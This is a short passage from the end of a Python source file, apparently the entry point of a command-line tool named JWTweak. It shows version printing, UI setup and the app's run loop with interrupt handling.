        print(f"JWTweak {__version__}")
        return
    ui = make_ui(color=color, prefer_rich=prefer_rich)
    try:
        App(ui).run(initial)
    except (KeyboardInterrupt, EOFError):
        print()


if __name__ == "__main__":
    main()